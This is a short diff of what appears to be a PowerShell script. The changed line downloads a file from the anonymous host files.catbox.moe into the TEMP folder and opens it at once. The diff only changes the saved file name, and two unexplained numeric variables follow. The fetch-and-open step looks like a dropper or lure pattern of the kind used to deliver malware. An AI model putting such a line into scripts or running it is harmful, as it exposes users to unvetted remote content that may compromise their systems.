@@ -1,4 +1,4 @@
-iwr 'https://files.catbox.moe/xxlzez.pdf' -OutFile ($d = Join-Path $env:TEMP 'spread.pdf'); ii $d
+iwr 'https://files.catbox.moe/xxlzez.pdf' -OutFile ($d = Join-Path $env:TEMP 'method.pdf'); ii $d
 
 $1 = 2564417
 $2 = 4137
